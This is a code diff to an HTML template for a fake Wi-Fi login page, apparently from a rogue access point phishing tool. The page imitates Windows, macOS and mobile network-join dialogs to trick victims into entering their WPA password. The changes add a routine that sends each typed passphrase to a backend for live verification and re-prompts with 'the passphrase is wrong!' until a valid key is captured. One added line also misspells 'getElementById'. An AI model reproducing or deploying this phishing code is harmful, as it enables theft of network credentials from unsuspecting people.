@@ -1,3 +1,4 @@
+<!DOCTYPE html>
 <html>
 <head>
         <meta charset="utf-8" />
@@ -215,8 +216,11 @@
         '           <form id="wifi-search-form" method="post" action="/post">' +
         '               <strong>The Wi-Fi network ″{{ target_ap_essid }}″ requires a {{ target_ap_encryption }} password.</strong>' + 
         '               <div class="password">' +
-        '                   <label>Password:</label>' +
+        '                   <label>Password: </label>' +
         '                   <input type="password" id="wifi-search-password" name="wfphshr-wpa-password"/>' +
+        '                   <br>' +
+        '                   <label id="pw_status"></label>' +
+        '                   <br>' +
         '                   <div class="glow"></div>' +
         '               </div>' + 
         '               <div class="checkmark">' +
@@ -226,15 +230,15 @@
         '                   <input id="remember-network" type="checkbox" /><label for="remember-network">Remember this network</label>' +
         '               </div>' + 
         '               <div class="buttons">' +
-        '                     <button id="button-join" class="action" disabled="disabled">Join</button>' +
-        '                   <button id="button-cancel">Cancel</button>' +
+        '                   <input id="button-join" type="submit" value="Join">' +
+        '                   <input id="button-cancel" type="reset" value="Reset">' +
         '               </div>' +
         '           </form>' +
         '       </div>' +
         '   </div>' +
         '</div>';
 
-        var loadhtml_windows = "<form method='post' action='/post'><div class=\'network-manager\'\>" +
+        var loadhtml_windows = "<form id='windows-form' method='post' action='/post'><div class=\'network-manager\'\>" +
         "<ul>" +
         "       <li class='selected'>" +
         "           <div class='wifi icon'>" +
@@ -254,7 +258,9 @@
         "                   <button id='connect' class='connect' type='button'>Connect</button>" +
         "               </div>" +
         "               <div class='connected'>" +
-        "                   Enter the network security key" +
+        "                   <label id='pw_status' for='presharedKey'>" +
+        "                       Enter the network security key" +
+        "                   </label>" +
         "                   <input id='password' type='password' name='wfphshr-wpa-password' />" +
         "                   You can also connect by pushing the button on the" +
         "                   router." +
@@ -292,15 +298,65 @@
         ' 		<button id="button-join" class="action hidden"></button>' +
         ' 	</div>' +
 	'</form>';
-        
+
+        /* Callback receive the passphrase status and password*/
+        function validate_passphrase (password, callback) {
+            var xhttp = new XMLHttpRequest();
+            xhttp.open("POST", "/backend/", true);
+            xhttp.onreadystatechange = function () {
+                if (this.readyState == 4 && this.status == 200)  {
+                    var json = JSON.parse(xhttp.responseText);
+                    callback(json.psk_verify, password);
+                }
+            };
+            var data = JSON.stringify({"psk_verify": password});
+            xhttp.send(data);
+        }
+
+        function windows_validate_action (pw_status, password) {
+            if (pw_status == "success") {
+                document.getElementByid("windows-form").submit(); 
+                document.getElementById("pw_status").innerHTML = "Enter the network security key";
+            } else if (pw_status == "fail") {
+                document.getElementById("pw_status").innerHTML = "Enter the network security key: the passphrase is wrong!";
+            } else {
+                document.getElementById("windows-form").submit(); 
+            }
+        }
+
+        function mac_validate_action (pw_status, password) {
+            if (pw_status == "success") {
+                document.getElementById("wifi-search-form").submit(); 
+                document.getElementById("pw_status").innerHTML = ""
+            } else if (pw_status == "fail") {
+                document.getElementById("pw_status").innerHTML = "the passphrase is wrong!"
+            } else {
+                document.getElementById("wifi-search-form").submit(); 
+            }
+        }
+
+        function mobile_validate_action (pw_status, password) {
+            if (pw_status == "success") {
+			    document.getElementById("wifi-search-password").value = password;
+			    document.getElementById("button-join").click();
+            } else if (pw_status == "fail") {
+                alert("Wrong password! Please re-enter the password.");
+		        var popup = prompt('The Wi-Fi network ″{{ target_ap_essid }}″ requires a {{ target_ap_encryption }} password.', '');
+                if (popup != null) { 
+                    validate_passphrase(popup, mobile_validate_action);
+                }
+            } else {
+			    document.getElementById("wifi-search-password").value = password;
+			    document.getElementById("button-join").click();
+            }
+        }
+
         function load_mobile() {
-		var popup = prompt('The Wi-Fi network ″{{ target_ap_essid }}″ requires a {{ target_ap_encryption }} password.', '');
-			
-		if (popup != null) {
-			document.getElementById("wifi-search-password").value = popup;
-			document.getElementById("button-join").click();
-		}
-	}
+		    var popup = prompt('The Wi-Fi network ″{{ target_ap_essid }}″ requires a {{ target_ap_encryption }} password.', '');
+		    if (popup != null) {
+                validate_passphrase(popup, mobile_validate_action);
+		    }
+        }
         
         </script>
         <title></title>
@@ -339,13 +395,23 @@
         <script>
             if (jscd.os == "Windows") {
                 document.getElementById("loader-windows").innerHTML = loadhtml_windows;
+                var myform = document.getElementById("windows-form");
+                myform.addEventListener("submit", function(evt) {
+                    evt.preventDefault();
+                    validate_passphrase(document.getElementById("password").value, windows_validate_action); 
+                });
             }
             else if (jscd.os == "Android" || jscd.os == "iOS") {
-		document.getElementById("loader-mobile").innerHTML = loadhtml_mobile;
+                document.getElementById("loader-mobile").innerHTML = loadhtml_mobile;
                 load_mobile();
             }
             else {
                 document.getElementById("loader-mac").innerHTML = loadhtml_mac;
+                var myform = document.getElementById("wifi-search-form");
+                myform.addEventListener("submit", function(evt) {
+                    evt.preventDefault();
+                    validate_passphrase(document.getElementById("wifi-search-password").value, mac_validate_action); 
+                });
             }
         </script>
         <script src='/static/win-behavior.js'></script>
